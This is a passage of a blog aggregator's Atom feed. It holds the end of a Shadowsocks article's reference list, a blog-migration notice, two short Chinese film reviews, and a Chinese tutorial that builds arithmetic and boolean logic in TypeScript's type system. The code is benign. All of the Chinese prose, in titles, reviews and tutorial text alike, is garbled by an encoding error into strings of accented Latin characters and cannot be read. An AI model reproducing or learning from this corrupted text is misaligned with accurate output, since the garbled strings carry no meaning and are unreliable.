href="https://toutiao.io/posts/5fo90o/preview">Shadowsocks åŸç†è¯¦è§£</a></li><li><a href="https://printempw.github.io/why-do-shadowsocks-deprecate-ota/">ä¸ºä½• shadowsocks è¦å¼ƒç”¨ä¸€æ¬¡æ€§éªŒè¯ (OTA) - PRIN BLOG</a></li><li><a href="https://and-rev.blogspot.com/2016/09/shadowsocks.html">Shadowsocks çš„å®šåˆ¶å’Œâ€œä¸å®‰å…¨æ€§â€çš„åˆ†æ ~ and-rev</a></li><li><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">Block cipher mode of operation - Wikipedia</a></li><li><a href="https://baike.baidu.com/item/%E5%AE%8C%E6%95%B4%E6%80%A7/949221">å®Œæ•´æ€§ï¼ˆä¿¡æ¯å®‰å…¨çš„ä¸‰ä¸ªåŸºæœ¬è¦ç‚¹ä¹‹ä¸€ï¼‰_ç™¾åº¦ç™¾ç§‘</a></li></ul><h1>Update 2020-02-15</h1><p>æ·»åŠ äº†å¯¹ <code>IV</code> é‡ç”¨ç›¸å…³çš„è¡¥å……ã€‚</p>]]></content>
        <author>
            <name><![CDATA[RÂ·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/version-2/</id>
        <title><![CDATA[Version 2]]></title>
        <updated>2020-02-14T14:56:07+08:00</updated>
        <link href="https://invariant.me/version-2/"/>
        <content type="text/html" src="https://invariant.me/version-2/"><![CDATA[<img src="https://images.unsplash.com/photo-1530714457710-6bf1899c1d32?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Version 2"><p>I'm migrating and restarting my blog, which is previously at <a href="https://mnotes.me">https://mnotes.me</a> .</p><p>Take a look at the <a href="https://invariant.me/about/">About</a> page or <a href="https://invariant.me/subscribe/">subscribe</a> now!</p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/408</id>
        <title><![CDATA[é‚£äº›å¹´çš„è¿åŠ¨ï¼ˆè§‚ã€Šæœé˜³æ²Ÿã€‹æœ‰æ„Ÿï¼‰]]></title>
        <updated>2020-02-11T09:34:26+08:00</updated>
        <link href="https://www.suruifu.com/posts/408"/>
        <content type="text/html" src="https://www.suruifu.com/posts/408"><![CDATA[<h3>å…³äºæˆæ›²æ–‡åŒ–</h3>
<p>ä¸å…¶è¯´æ˜¯æˆæ›²ï¼Œæˆ‘æ›´æ„¿æ„ç§°å…¶ä¸ºâ€œä¸­å›½ç”µå½±â€ã€‚çˆ·çˆ·å¥¶å¥¶ä¼šæ¯”è¾ƒå–œæ¬¢è¿™ä¸ªä¸œè¥¿ï¼Œå¾ˆå¤šå¹´è½»äººä¼šå¯¹ä¹‹å—¤ä¹‹ä»¥é¼»ã€‚è€Œè±«å‰§ã€Šæœé˜³æ²Ÿã€‹åˆ™æ˜¯ä¸€ä¸ªé‚£ä¸ªå¹´ä»£çš„ç»å…¸ï¼Œä¹‹æ‰€ä»¥è¿™æ ·ï¼Œæ›´å¤šè¿˜æ˜¯æ”¿æ²»å› ç´ ç½¢äº†ã€‚<br />
* èŠ‚å¥æ¬¢å¿«ï¼Œä¸ç†Ÿå„ç§æµè¡ŒéŸ³ä¹ï¼Œè‡ªæˆä¸€å®¶ï¼Œåˆ«å…·é£éŸµ<br />
* è¯´è¯å¤ªæ…¢ï¼Œå¼€äºŒå€é€Ÿè¿˜æ˜¯è§‰å¾—æ…¢ï¼Œæˆ‘å¹³å¸¸æ˜¯å¾ˆå°‘å¼€äºŒå€é€Ÿçš„<br />
* æ•…äº‹æƒ…èŠ‚å¾ˆå°‘ï¼Œä½†å„ç§è¡¨ç°å´å¾ˆåˆ°ä½</p>
<h3>å…³äºç”µå½±å†…å®¹</h3>
<p>å®¶é‡Œé•¿è¾ˆè®²å¹¶æ²¡æœ‰äººæ€æƒ³è§‰æ‚Ÿé«˜åˆ°æƒ³è¦åœ¨å†œæ‘å¥‹æ–—ä¸€ç™¾å¹´ï¼Œæ•´ä¸ªå‰§ä¸è¿‡å°±æ˜¯ä¸€ä¸ªæ–‡åŒ–å®£ä¼ ç‰‡è€Œå·²ï¼Œå› æ­¤ä¹Ÿå°±æ²¡æœ‰é‚£ä¹ˆå¤šéœ€è¦æ€è€ƒçš„ä¸œè¥¿äº†ã€‚</p>]]></content>
        <author>
            <name><![CDATA[è‹ç‘è¾…çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/394</id>
        <title><![CDATA[å¹³ï¼ˆè§‚ã€Š9 Songsã€‹æœ‰æ„Ÿï¼‰]]></title>
        <updated>2020-02-07T05:39:56+08:00</updated>
        <link href="https://www.suruifu.com/posts/394"/>
        <content type="text/html" src="https://www.suruifu.com/posts/394"><![CDATA[<p><img src="https://s.suruifu.com/www/2020/02/lisa_matt_3.png" alt="" /><br />
è¯´èµ·æ€§ï¼Œè¿™ä¸ªå‰§å¤ªå¹³æ·¡ã€‚â€œåˆ«çœ‹è¿™ä¸ªï¼Œæ²¡ä»€ä¹ˆæ„æ€â€ã€‚ä»æ€§çš„è§’åº¦å‡ºå‘ï¼Œå¤ªå¹³æ·¡äº†ã€‚<br />
<img src="https://s.suruifu.com/www/2020/02/lisa_matt_1.png" alt="" /><br />
è¯´èµ·çˆ±ï¼Œè¿™ä¸ªå‰§å¤ªå¹³å‡¡ã€‚æ•´ä¸ªå‰§çœ‹ä¸‹æ¥ä¸æ˜¯åœ¨åˆ¶é€ æ„ŸåŠ¨ï¼Œè€Œæ˜¯åœ¨æ­Œé¢‚å¹³å‡¡ã€‚<br />
<img src="https://s.suruifu.com/www/2020/02/lisa.png" alt="" /><br />
ä¸¤ä¸ªäººéƒ½ä¸æƒ³è¦long goodbyeï¼ŒMatt å´è¿çº¦äº†ï¼Œä»–é€‰æ‹©äº†å›å¿†ï¼Œè¿™æ˜¯ä¸€ä¸ªå¤šé•¿æ—¶é—´çš„ç¦»åˆ«å‘€ã€‚<br />
<img src="https://s.suruifu.com/www/2020/02/matt.png" alt="" /><br />
Now she&#8217;s gone, love burns inside me.</p>]]></content>
        <author>
            <name><![CDATA[è‹ç‘è¾…çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/typescript-type-system-and-functional-programming.html</id>
        <title><![CDATA[TypeScript ç±»å‹ç³»ç»Ÿä¸å‡½æ•°å¼ç¼–ç¨‹]]></title>
        <updated>2020-02-04T12:37:00+08:00</updated>
        <link href="https://blog.rexskz.info/typescript-type-system-and-functional-programming.html"/>
        <content type="text/html" src="https://blog.rexskz.info/typescript-type-system-and-functional-programming.html"><![CDATA[<h1>èƒŒæ™¯</h1><p>æ¥è§¦ TypeScript å·²ç»æœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œè¿™æœŸé—´å†™è¿‡ä¸€äº›å¤æ‚çš„ç±»å‹ï¼ˆä¾‹å¦‚ <a href="https://blog.rexskz.info/issues-in-typescript-vue-component-lib.html#toc-link-6">è¿™ç¯‡æ–‡ç« </a>ï¼‰ï¼Œæˆ‘å¼€å§‹æ„è¯†åˆ°ï¼šTypeScript çš„ç±»å‹ç³»ç»Ÿå†™èµ·æ¥å°±åƒå‡½æ•°å¼ç¼–ç¨‹ä¸€æ ·ã€‚å»å¹´æŸå¤©ï¼Œä¸€ä¸ªåŒäº‹ç»™æˆ‘å‘äº†ä¸ªé“¾æ¥ï¼Œé‡Œé¢è®²çš„æ˜¯â€œTypeScript ç±»å‹ç³»ç»Ÿçš„å›¾çµå®Œå¤‡â€ï¼Œé‡Œé¢çš„ä¸€äº›å†…å®¹æˆ‘è¿˜åœ¨åŠªåŠ›ç†è§£åˆ°å¯ä»¥åˆ†äº«çš„ç¨‹åº¦ï¼Œä½†ä¸€äº›ä»£ç å·®ä¸å¤šå¯ä»¥è¯´æ˜ TypeScript ç±»å‹ç³»ç»Ÿè·Ÿå‡½æ•°å¼ç¼–ç¨‹çš„æ€æƒ³éå¸¸æ¥è¿‘äº†ã€‚</p><h1>å‰æœŸçŸ¥è¯†</h1><ul><li>æŒæ¡ TypeScript çš„ <a href="https://www.typescriptlang.org/docs/handbook/basic-types.html">åŸºæœ¬ç±»å‹</a>ï¼Œç›¸ä¿¡å¤§å®¶éƒ½äº†è§£ï¼›</li><li>æŒæ¡ TypeScript çš„ <a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html">é«˜çº§ç±»å‹</a> å’Œ <a href="https://www.typescriptlang.org/docs/handbook/generics.html">æ³›å‹</a>ï¼›</li><li>éå¸¸ç†Ÿæ‚‰ <code>extends</code> å’Œ <code>infer</code> çš„ä½¿ç”¨ï¼›</li><li>â€œå‡½æ•°å¼ç¼–ç¨‹â€çš„æ¦‚å¿µï¼Œç›¸ä¿¡å¤§å®¶éƒ½æˆ–å¤šæˆ–å°‘ä»å…¬ä¼—å·é‡Œé¢å¬åˆ°è¿‡ã€‚</li></ul><blockquote><p>æ–‡ä¸­æ¥ä¸‹æ¥æ‰€æœ‰è·Ÿ TypeScript ç›¸å…³çš„éƒ¨åˆ†ï¼Œé™¤éç‰¹æ®Šè¯´æ˜ï¼Œå¦åˆ™â€œå‡½æ•°â€ã€â€œå‚æ•°â€å‡ä¸ºæ–°çš„æ¦‚å¿µï¼Œè€Œé TypeScript ä¸­çš„â€œå‡½æ•°ç±»å‹â€ã€â€œå‚æ•°åˆ—è¡¨â€ã€‚</p></blockquote><h1>å…è´£å£°æ˜</h1><ol><li>æœ¬æ–‡åªæ˜¯è®²è¿°ä¸€ä¸ªâ€œç†è®ºä¸Šâ€å¯è¡Œçš„ä¸œè¥¿ï¼Œå¹¶éæ¨èå¤§å®¶æ—¥å¸¸è¿™æ ·å†™ã€‚äº‹å®ä¸Šï¼Œç±»å‹æ ‡æ³¨åº”å½“åœ¨é€‚å½“ç²¾ç¡®çš„æƒ…å†µä¸‹å°½å¯èƒ½ç®€æ´ï¼ˆå‚è€ƒ <code>@types/ramda</code> ä¸­å¯¹äº <code>pipe</code> ç­‰å‡½æ•°çš„ç±»å‹æ ‡æ³¨ï¼‰ï¼Œå› ä¸ºéœ€è¦æé«˜æ•ˆç‡ï¼›</li><li>æœ¬æ–‡çš„ä»£ç å®ç°å‡åªåœç•™åœ¨å®éªŒå®¤é˜¶æ®µï¼Œä¸è€ƒè™‘å¯èƒ½çš„æ€§èƒ½é—®é¢˜ã€‚</li></ol><h1>ä»å‡½æ•°å¼ç¼–ç¨‹è¯´èµ·</h1><p>å‡½æ•°å¼ç¼–ç¨‹æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š</p><ul><li>æè¿°æ˜ å°„ï¼šå‡½æ•°å¼ç¼–ç¨‹å¹¶éæè¿°è§£å†³é—®é¢˜çš„æ­¥éª¤ï¼Œè€Œæ˜¯æè¿°è¾“å…¥ä¸è¾“å‡ºçš„æŸç§æ˜ å°„å…³ç³»ï¼›</li><li>ä¸å¯å˜é‡ï¼šå‡½æ•°å¼ç¼–ç¨‹ä¸­æ²¡æœ‰æ‰€è°“çš„â€œå˜é‡èµ‹å€¼â€ï¼Œåªæœ‰â€œå‚æ•°ç»‘å®šâ€ï¼Œä¸€æ—¦æŸä¸ªå‚æ•°ç»‘å®šäº†ä¸€ä¸ªå€¼ï¼Œåˆ™ä¸èƒ½è¢«é‡æ–°ç»‘å®šï¼›</li><li>æ— å‰¯ä½œç”¨ï¼šå‡½æ•°çš„è¾“å‡ºåªä¾èµ–äºè¾“å…¥çš„å‚æ•°ï¼Œå…¥å‚ç›¸åŒåˆ™è¿”å›å€¼ä¸€å®šç›¸åŒï¼Œå‡½æ•°è¿è¡Œè¿‡ç¨‹ä¸­ä¹Ÿä¸ä¼šå¯¹å¤–ç•Œäº§ç”Ÿä»»ä½•å½±å“ã€‚</li><li>æƒ°æ€§æ±‚å€¼ï¼šåªæœ‰çœŸæ­£ç”¨åˆ°çš„å€¼æ‰éœ€è¦è¢«è®¡ç®—ï¼›</li><li>å‡½æ•°æ˜¯ä¸€ç­‰å…¬æ°‘ï¼šå‡½æ•°å¯ä»¥ï¼ˆç”šè‡³ç»å¸¸ï¼‰ä½œä¸ºå¦ä¸€ä¸ªå‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼ï¼Œif ç­‰è¯­å¥ä¹Ÿæ˜¯å‡½æ•°ï¼›</li></ul><p>ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p><pre><code class="lang-javascript">/**
 * ç®€å•çš„æ–æ³¢é‚£å¥‘æ•°åˆ—
 */
function fibonacci(n) {
    return n &lt;= 1 ? 1 : fibonacci(n - 1) + fibonacci(n - 2);
}
/**
 * ç®€å•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•
 */
function gcd(x, y) {
    return y === 0 ? x : gcd(y, x % y);
}
/**
 * è¶…è¿ç®—å‡½æ•°
 * https://en.wikipedia.org/wiki/Hyperoperation
 * n = 0: b+1ï¼ˆåç»§ï¼‰
 * n = 1: a+bï¼ˆåŠ æ³•ï¼Œå³ b æ¬¡ a çš„åç»§ï¼‰
 * n = 2: a*bï¼ˆä¹˜æ³•ï¼Œå³ b ä¸ª a ç›¸åŠ ï¼‰
 * n = 3: a^bï¼ˆä¹˜æ–¹ï¼Œå³ b ä¸ª a ç›¸ä¹˜ï¼‰
 * n = 4: a^a^a^...^aï¼ˆè¶…å¹‚ï¼Œå³ b ä¸ª a ä¸æ–­ä¹˜æ–¹ï¼‰
 *        \_________/
 *          b ä¸ª a
 * n = â€¦â€¦â€¦â€¦
 */
function hyperoperation(n, a, b) {
    return n === 0
        ? b + 1
        : n === 1 &amp;&amp; b === 0
            ? a
            : n === 2 &amp;&amp; b === 0
                ? b
                : n &gt; 2 &amp;&amp; b === 0
                    ? 1
                    : hyperoperation(n - 1, a, hyperoperation(n, a, b - 1));
}</code></pre><p>ç”±äºå‡½æ•°å¼ç¼–ç¨‹ç»å¸¸å‡ºç°é€’å½’ï¼Œä¸“é—¨çš„è¯­è¨€ï¼ˆHaskell ç­‰ï¼‰ä¼šå°†å°¾é€’å½’è½¬æ¢ä¸ºå¾ªç¯ï¼Œä»¥æå‡è¿è¡Œæ•ˆç‡ï¼›æ­¤å¤–ç”±äºå‡½æ•°å¼ç¼–ç¨‹æœ‰â€œæ— å‰¯ä½œç”¨â€çš„ç‰¹æ€§ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è®°å¿†åŒ–ç­‰æ–¹å¼é¿å…é‡å¤è®¡ç®—ã€‚</p><h1>TypeScript æ³›å‹çš„ä¾‹å­</h1><p>åœ¨ TypeScript ä¸­ï¼Œæˆ‘ä»¬å¶å°”ä¼šç”¨åˆ°æ³›å‹ï¼Œæ¯”å¦‚ä¸‹é¢çš„å†·é¥­ï¼ˆä½ çŒœå¯¹äº†ï¼Œè¿™äº›éƒ½å‡ºè‡ªæœ¬æ–‡çš„ç¬¬ä¸€ä¸ªé“¾æ¥ï¼‰ï¼š</p><pre><code class="lang-typescript">type InstanceType&lt;T&gt; =
    T extends ConstructorType&lt;infer R&gt;
        ? R
        : T;
type RemovePropOptions&lt;T&gt; =
    NonNullable&lt;
        T extends PropOptions&lt;infer R&gt;
            ? R
            : null
    &gt;;
type OneOfTypePropOptions&lt;T&gt; =
    T extends ArrayType
        ? RemovePropOptions&lt;ValueOf&lt;T&gt;&gt;
        : T;
type ShapePropOptions&lt;T&gt; =
    T extends ShapeType
        ? { [K in keyof T]: RemovePropOptions&lt;T[K]&gt; }
        : T;</code></pre><p>ä¹çœ‹ä¸Šå»ï¼ŒTypeScript çš„æ³›å‹é•¿å¾—å¾ˆåƒå‡½æ•°ï¼šå®šä¹‰æ³›å‹ç›¸å½“äºå®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œå…¶ä¸­çš„ <code>T</code>ã€<code>R</code> ç­‰ç±»å‹å˜é‡å¯ä»¥è¢«çœ‹ä½œå‚æ•°ã€‚ä½†é€šè¿‡ä¸æ–­å°è¯•å¤–åŠ æŸ¥èµ„æ–™ï¼Œæˆ‘ä»¬æœ€ç»ˆéƒ½ä¼šæ„è¯†åˆ°ï¼šåœ¨ TypeScript çš„æ³›å‹å®šä¹‰ä¸­æ˜¯æ— æ³•è‡ªç”±çš„å®šä¹‰å˜é‡å¹¶èµ‹å€¼çš„ï¼Œè¿™æ„å‘³ç€å®ƒè·Ÿæˆ‘ä»¬æ—¥å¸¸å†™çš„å‡½æ•°è¿˜æœ‰ä¸€äº›åŒºåˆ«ã€‚</p><p>ç„¶é¹…å¤§å®¶æ˜¯å¦è§‰å¾—è¿™ç§å†™æ³•è·Ÿå‡½æ•°å¼ç¼–ç¨‹æœ‰ç‚¹çœ¼ç†Ÿï¼Ÿæœ‰æ²¡æœ‰å¯èƒ½ç”¨ TypeScript ç±»å‹ç³»ç»Ÿæ¥é‡å†™ä¸Šé¢çš„å‡½æ•°å¼ç¼–ç¨‹ä»£ç å‘¢ï¼Ÿ</p><p>ä¸ç®¡æœ‰æ²¡æœ‰æ„ä¹‰ï¼Œæˆ‘ä»¬å…ˆè¯•ç€ç”¨æ˜“äºç†è§£ã€ä½†æ˜¯é”™è¯¯çš„è¯­æ³•å†™ä¸€ä¸‹ï¼ˆä¸ºäº†é¿å…é«˜äº®å‡ºç°æ··ä¹±ï¼Œè¿™æ®µä»£ç å°±ä¸åŠ é«˜äº®äº†ï¼‰ï¼š</p><pre><code class="lang-text">type Fibonacci&lt;N&gt; =
    N &lt;= 1 ? 1 : Fibonacci&lt;N - 1&gt; + Fibonacci&lt;N - 2&gt;;
type Gcd&lt;X, Y&gt; =
    Y = 0 ? X : Gcd&lt;Y, X % Y&gt;;
type Hyperoperation&lt;N, A, B&gt; =
    N = 0
        ? B + 1
        : N = 1 &amp; B = 0
          ? A
          : N = 2 &amp; B = 0
            ? B
            : N &gt; 2 &amp; B = 0
                ? 1
                : Hyperoperation&lt;N - 1, A, Hyperoperation&lt;N, A, B - 1&gt;&gt;;</code></pre><h1>ä»é›¶å¼€å§‹çš„é€ è½®å­ç”Ÿæ´»</h1><p>Emmmâ€¦â€¦è™½ç„¶çœ‹èµ·æ¥æŒºå®¹æ˜“ç†è§£çš„ï¼Œä½†è¿™æ¯•ç«Ÿå®Œå…¨ä¸æ˜¯ TypeScriptâ€¦â€¦ä¸ºäº†ç”¨çœŸæ­£çš„ TypeScript æ¥ç¼–å†™è¿™æ®µä»£ç ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ç©¶ç«Ÿéœ€è¦å“ªäº›è½®å­ï¼ˆå·¥å…·ç±»å‹ï¼‰ã€‚</p><h2>å®šä¹‰â€œç±»å‹â€</h2><p>é¦–å…ˆï¼Œä¸ºäº†èƒ½è®© TypeScript å…è®¸æˆ‘ä»¬å¯¹æ³›å‹å‚æ•°åšä¸€äº›æ“ä½œï¼ˆä¾‹å¦‚å–é•¿åº¦ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå®šä¹‰ä¸€äº›ç±»å‹ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬æŠ›å¼€ JavaScript çš„ä¸€åˆ‡çŸ¥è¯†ï¼Œå› ä¸ºåœ¨ TypeScript ç±»å‹ç³»ç»Ÿçš„ä¸–ç•Œä¸­ï¼Œæˆ‘ä»¬ç›®å‰ä¸€æ— æ‰€æœ‰â€”â€”è¿™æ„å‘³ç€æˆ‘ä»¬è¦ä»æœ€åŸºç¡€çš„å¼€å§‹å®šä¹‰ï¼š</p><pre><code class="lang-typescript">// ç”¨å­—ç¬¦ä¸²æ¥ä»£æ›¿é€»è¾‘å€¼
type Bool = 'true' | 'false';
// ç”¨æ•°ç»„çš„é•¿åº¦ä½œä¸ºæ•°å­—çš„å¤§å°
type Int = any[];
// ç¬¬ä¸€ä¸ªæ•°å­—
type _0 = [];</code></pre><h2>ç®€å•çš„ä»£æ•°ç³»ç»Ÿ</h2><p>é™¤äº†â€œç±»å‹â€ä»¥å¤–ï¼Œæ˜ å…¥çœ¼å¸˜çš„å°±æ˜¯ <code>&lt;=</code>ã€<code>+</code>ã€<code>-</code> ç­‰ç¬¦å·ã€‚æˆ‘ä»¬éœ€è¦å…ˆå®ç°ä¸€ä¸ªç®€å•çš„ä»£æ•°ç³»ç»Ÿã€‚ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬å‡è®¾æ‰€æœ‰çš„æ•°å­—éƒ½æ˜¯éè´Ÿæ•´æ•°ã€‚</p><p>é¦–å…ˆä»â€œåç»§â€è¿ç®—å¼€å§‹ï¼ŒæœŸæœ›çš„æ•ˆæœå¦‚ä¸‹ï¼š</p><pre><code class="lang-typescript">type Next&lt;I extends Int&gt; = Prepend&lt;any, I&gt;;

type _1 = Next&lt;_0&gt;; // [any]
type _2 = Next&lt;_1&gt;; // [any, any]
type _3 = Next&lt;_2&gt;; // [any, any, any]</code></pre><p>è¿™é‡Œçš„ <code>Prepend</code> è¯¥å¦‚ä½•å®ç°å‘¢ï¼Ÿæœ‰ä¸€ä¸ªå¾ˆ Tricky çš„æ–¹æ³•ï¼Œæˆ‘ä»¬æ„é€ ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„å‚æ•°ç±»å‹æ˜¯ <code>any</code> + <code>any[]</code>ï¼Œç„¶åé€šè¿‡ <code>extends</code> å’Œ <code>infer</code> å°†çœŸæ­£çš„å‚æ•°ç±»å‹æå–å‡ºæ¥ï¼š</p><pre><code class="lang-typescript">type Prepend&lt;E, T extends Int&gt; =
    ((e: E, ...list: T) =&gt; any) extends ((...list: infer R) =&gt; any)
      ? R : T;</code></pre><p>åŒç†ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª <code>Prev</code> å‡½æ•°ï¼Œå®ƒæ˜¯ <code>Next</code> å‡½æ•°çš„é€†è¿ç®—ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å‡½æ•°å¼ç¼–ç¨‹ä¸­å¸¸ç”¨çš„ <code>Tail</code> æ¥å®ç°ï¼š</p><pre><code class="lang-typescript">type Tail&lt;T extends Int&gt; =
    ((...t: T) =&gt; any) extends ((_: any, ...tail: infer R) =&gt; any)
    ? R : [];

type Prev&lt;I extends Int&gt; = Tail&lt;I&gt;;
type __2 = Prev&lt;_3&gt;; // [any, any]</code></pre><p>åŠ æ³•å°±æ˜¯ä¸æ–­åœ°è°ƒç”¨ <code>Next</code>ï¼š</p><pre><code class="lang-typescript">type Add&lt;A extends Int, B extends Int&gt; =
    B extends _0 ? A : Add&lt;Next&lt;A&gt;, Prev&lt;B&gt;&gt;;
//                     ^^^^^^^^^^^^^^^^^^^^^</code></pre><p>ç„¶è€Œå¦‚æœè¿™æ ·å†™ï¼ŒTypeScript åœ¨æ¨å¯¼æ—¶ä¼šæ— æ³•ç¡®å®š <code>Add</code> ç©¶ç«Ÿæ˜¯ä¸ªä»€ä¹ˆç±»å‹ï¼ˆæŠ¥é”™ <code>ts(2456)</code>ï¼Œå› ä¸ºå®ƒåœ¨æ¯ä¸€å±‚éƒ½æ— æ³•å¾—åˆ°ä¸€ä¸ªç¡®å®šçš„ç»“æœï¼‰ï¼Œæ‰€ä»¥éœ€è¦ä¸€ç‚¹å˜é€šã€‚ä¸‹é¢ä¸€ç§å†™æ³•å¯ä»¥è®© TypeScript åœ¨é€’å½’çš„æ¯ä¸€å±‚éƒ½æœ‰ä¸€ä¸ªç¡®å®šçš„ç»“æœï¼š</p><pre><code class="lang-typescript">type Add&lt;A extends Int, B extends Int&gt; = {
    'true': A
    'false': Add&lt;Next&lt;A&gt;, Prev&lt;B&gt;&gt;
}[B extends _0 ? 'true' : 'false'];

type _4 = Add&lt;_1, _3&gt;; // [any, any, any, any]
type _5 = Add&lt;_2, _3&gt;; // [any, any, any, any, any]</code></pre><blockquote><p>æ³¨æ„ï¼šTypeScript åœ¨é€’å½’è¶…è¿‡ 50 å±‚ä¹‹åï¼Œä¼šå¼ºè¡Œæ¨å¯¼ä¸º <code>any</code>ï¼Œæ‰€ä»¥å®é™…ä¸Šæ¥è®²ï¼Œæˆ‘ä»¬ç›®å‰çš„ä»£ç æ— æ³•å¤„ç† 50 ä»¥ä¸Šçš„åŠ æ³•ã€‚</p></blockquote><p>å½“ç„¶ï¼Œå…¶ä¸­çš„ <code>B extends _0 ? 'true' : 'false'</code> å¯ä»¥æŠ½æˆä¸€ä¸ªå·¥å…·å‡½æ•°ï¼š</p><pre><code class="lang-typescript">type Eq&lt;A extends Int, B extends Int&gt; = A extends B ? 'true' : 'false';

type Add&lt;A extends Int, B extends Int&gt; = {
    'true': A
    'false': Add&lt;Next&lt;A&gt;, Prev&lt;B&gt;&gt;
}[Eq&lt;B, _0&gt;];</code></pre><p>å‡æ³•ä¹Ÿå¯ä»¥é€šè¿‡ç±»ä¼¼çš„æ–¹å¼å†™å‡ºæ¥ï¼š</p><pre><code class="lang-typescript">type Sub&lt;A extends Int, B extends Int&gt; = {
    'true': A
    'false': Sub&lt;Prev&lt;A&gt;, Prev&lt;B&gt;&gt;
}[Eq&lt;B, _0&gt;];

type __3 = Sub&lt;_5, _2&gt;; // [any, any, any]</code></pre><p>ä¹˜æ³•æˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ªè¾…åŠ©å‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬è¦ä¿å­˜ä¸€ä¸ªç´¯åŠ å™¨ï¼š</p><pre><code class="lang-typescript">type _Mul&lt;Counter extends Int, A extends Int, B extends Int&gt; = {
    'true': Counter
    'false': _Mul&lt;Add&lt;Counter, A&gt;, A, Prev&lt;B&gt;&gt;
//           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
}[Eq&lt;B, _0&gt;];

type Mul&lt;A extends Int, B extends Int&gt; = _Mul&lt;_0, A, B&gt;;</code></pre><p>çœ‹ä¼¼å¾ˆç®€å•çš„ä¸œè¥¿ï¼Œä½†æ˜¯ TypeScript ä¼šæŠ¥ <code>ts(2589)</code>ï¼Œå› ä¸ºå®ƒè®¤ä¸ºè¿™æ ·å¯èƒ½ä¼šé€’å½’éå¸¸æ·±ï¼Œæ‰€ä»¥ç›´æ¥æ‹’ç»æ¨å¯¼ã€‚è¿™é‡Œå¯ä»¥ç”¨ <code>infer</code> å°†æœªæ¥éœ€è¦çš„è¿ç®—æå‰ä¸€äº›ï¼š</p><pre><code class="lang-typescript">type _Mul&lt;Counter extends Int, A extends Int, B extends Int&gt; = {
    'true': Counter
    'false': Add&lt;Counter, A&gt; extends infer R ? _Mul&lt;R, A, Prev&lt;B&gt;&gt; : never
//                                                  ^
}[Eq&lt;B, _0&gt;];</code></pre><p>æŠ¥é”™å˜æˆäº† <code>ts(2344)</code>ï¼Œè¯´ <code>R</code> ä¸æ˜¯ä¸€ä¸ª <code>Int</code>ã€‚å› ä¸º TypeScript çš„ <code>infer</code> æ˜¯æ— æ³•é¢„å…ˆçŸ¥é“ç»“æœçš„ï¼Œä½†æˆ‘ä»¬çŸ¥é“å®ƒä¸€å®šæ˜¯ä¸ª <code>Int</code>ï¼Œå› æ­¤å†å†™ä¸€ä¸ªè½¬æ¢å‡½æ•° <code>Cast</code>ï¼Œç›¸å½“äºå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ˆäº‹å®ä¸Šæ ¹æœ¬æ²¡è½¬ï¼‰ï¼š</p><pre><code class="lang-typescript">type Cast&lt;X, Y&gt; = X extends Y ? X : Y;

type _Mul&lt;Counter extends Int, A extends Int, B extends Int&gt; = {
    'true': Counter
    'false': Add&lt;Counter, A&gt; extends infer R ? _Mul&lt;Cast&lt;R, Int&gt;, A, Prev&lt;B&gt;&gt; : never
}[Eq&lt;B, _0&gt;];

type _6 = Mul&lt;_2, _3&gt;; // [any, any, any, any, any, any]</code></pre><p>æ•´é™¤å’Œå–æ¨¡é€šè¿‡ç›®å‰å·²æœ‰çš„å·¥å…·å‡½æ•°å·²ç»å¯ä»¥å†™å‡ºæ¥äº†ï¼ŒåŸç†æ˜¯å¾ªç¯ç›¸å‡ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥è‡ªè¡Œå®è·µä¸€ä¸‹ï¼Œå¼€å¤´å°±ç”¨ <code>Div&lt;A extends Int, B extends Int&gt;</code> å’Œ <code>Mod&lt;A extends Int, B extends Int&gt;</code> å§ã€‚</p><p>ç„¶åæ˜¯ä¸€äº›é’ˆå¯¹å¸ƒå°”å€¼çš„é€»è¾‘è¿ç®— <code>And</code>ã€<code>Or</code>ã€<code>Not</code>ï¼š</p><pre><code class="lang-typescript">type And&lt;A extends Bool, B extends Bool&gt; =
    A extends 'false' ? 'false' : B extends 'false' ? 'false' : 'true';

type _and_true_true = And&lt;'true', 'true'&gt;;     // 'true'
type _and_true_false = And&lt;'true', 'false'&gt;;   // 'false'
type _and_false_true = And&lt;'false', 'true'&gt;;   // 'false'
type _and_false_false = And&lt;'false', 'false'&gt;; // 'false'

type Or&lt;A extends Bool, B extends Bool&gt; =
    A extends 'true' ? 'true' : B extends 'true' ? 'true' : 'false';

type _or_true_true = Or&lt;'true', 'true'&gt;;     // 'true'
type _or_true_false = Or&lt;'true', 'false'&gt;;   // 'true'
type _or_false_true = Or&lt;'false', 'true'&gt;;   // 'true'
type _or_false_false = Or&lt;'false', 'false'&gt;; // 'false'

type Not&lt;A extends Bool&gt; = A extends 'true' ? 'false' : 'true';

type _not_true = Not&lt;'true'&gt;;   // 'false'
